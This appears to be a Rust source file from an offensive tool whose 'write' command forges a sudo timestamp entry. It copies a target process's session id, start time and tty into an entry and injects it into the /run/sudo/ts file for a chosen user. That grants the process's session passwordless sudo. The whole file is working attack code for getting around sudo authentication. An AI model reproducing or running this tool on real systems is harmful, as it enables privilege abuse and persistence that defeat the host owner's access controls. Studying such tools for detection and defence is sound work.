use crate::proc;
use crate::sudo;
use crate::sudo::SUDO_VERSION_UID;
use crate::timespec;
use crate::timestamp::{self, TimestampEntry, TS_TTY};
use crate::utils;
use clap::{Args, ValueEnum};
use std::fs::File;
use std::io::{Seek, Write, Read};
use std::{fmt, str};

#[derive(Args)]
pub struct WriteArgs {
    /// Process to receive sudo.
    #[arg(long)]
    pid: i32,

    #[command(flatten)]
    user: UserArg,

    /// File to inject the timestamp entry
    #[arg(long)]
    path: Option<String>,

    /// Type of the timestamp file to write
    #[arg(long, default_value_t = SudoMode::Auto)]
    mode: SudoMode,
}

#[derive(Args)]
#[group(required = false, multiple = false)]
struct UserArg {
    /// UID for the target user
    #[arg(long)]
    uid: Option<u32>,

    /// Username for the target user
    #[arg(long, short)]
    username: Option<String>,
}

#[derive(ValueEnum, Clone)]
enum SudoMode {
    Username,
    Uid,
    Auto,
}

impl fmt::Display for SudoMode {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Username => write!(f, "username"),
            Self::Uid => write!(f, "uid"),
            Self::Auto => write!(f, "auto"),
        }
    }
}

pub fn main_write(args: WriteArgs) -> Result<(), String> {
    let sid = utils::getsid(args.pid)
        .ok_or(format!("Unable to get sid of pid {}", args.pid))?;
    log::info!("Target session sid: {}", sid);

    let start_time = proc::process_start_time(sid)?;
    let ts = timespec::timespec_now()?;
    let tty = proc::process_tty_dev_t(sid)?;

    let uid = match args.user.uid {
        Some(u) => u,
        None => match &args.user.username {
            Some(username) => utils::username_to_uid(username)?,
            None => proc::process_ruid(sid)?
        }
    };

    log::info!("Target user uid: {}", uid);

    let new_tse = TimestampEntry {
        version: 2,
        size: 56,
        type_: TS_TTY,
        flags: 0,
        auth_uid: uid,
        sid,
        start_time,
        ts,
        id: tty,
    };

    let filepath = match args.path {
        Some(filepath) => filepath,
        None => {
            let filename = match args.mode {
                SudoMode::Uid => format!("{}", uid),
                SudoMode::Username => utils::uid_to_username(uid)
                    .map_err(|e| format!("Username not found: {}", e))?,
                SudoMode::Auto => {
                    let current_version = sudo::sudo_version()?;
                    log::info!("Sudo version: {}", current_version);
                    if sudo::parse_sudo_version(&current_version)
                        >= sudo::parse_sudo_version(SUDO_VERSION_UID)
                    {
                        format!("{}", uid)
                    } else {
                        utils::uid_to_username(uid)
                            .map_err(|e| format!("Username not found: {}", e))?
                    }
                }
            };
            format!("/run/sudo/ts/{}", filename)
        }
    };
    log::info!("Timestamps file: {}", filepath);

    let mut f = File::options()
        .read(true)
        .write(true)
        .create(true)
        .open(&filepath)
        .map_err(|e| format!("Unable to open {}: {}", filepath, e))?;

    match what_to_do_with_file(&mut f, &new_tse)? {
        TsAction::New => write_new_ts_file(&mut f, &new_tse)?,
        TsAction::Write(pos) => {
            f.seek(std::io::SeekFrom::Start(pos))
                .map_err(|e| format!("Unable to seek in ts file: {}", e))?;
            f.write(&new_tse.build())
                .map_err(|e| format!("Unable to write into ts file: {}", e))?;
        }
    }

    return Ok(());
}

fn write_new_ts_file(f: &mut File, tse: &TimestampEntry) -> Result<(), String> {
    let lock_tse = TimestampEntry::new_lockexcl();
    f.write(&lock_tse.build())
        .map_err(|e| format!("Unable to write into ts file: {}", e))?;
    f.write(&tse.build())
        .map_err(|e| format!("Unable to write into ts file: {}", e))?;

    return Ok(());
}

enum TsAction {
    New,
    Write(u64),
}

fn what_to_do_with_file(
    f: &mut File,
    target_tse: &TimestampEntry,
) -> Result<TsAction, String> {
    let mut buffer = Vec::new();
    f.read_to_end(&mut buffer)
        .map_err(|e| format!("Unable to read ts file: {}", e))?;

    if buffer.is_empty() {
        return Ok(TsAction::New);
    }

    let tses = timestamp::parse_ts_file(&buffer)
        .map_err(|_| format!("Unable to parse ts file"))?;

    let pos =
        find_tse_position(target_tse, &tses).unwrap_or(buffer.len() as u64);
    return Ok(TsAction::Write(pos));
}

fn find_tse_position(
    target_tse: &TimestampEntry,
    tses: &Vec<TimestampEntry>,
) -> Option<u64> {
    let mut pos = 0;
    for tse in tses.iter() {
        if tse.type_ == target_tse.type_
            && tse.version == target_tse.version
            && tse.auth_uid == target_tse.auth_uid
            && tse.sid == target_tse.sid
        {
            return Some(pos);
        }
        pos += tse.size as u64;
    }

    return None;
}
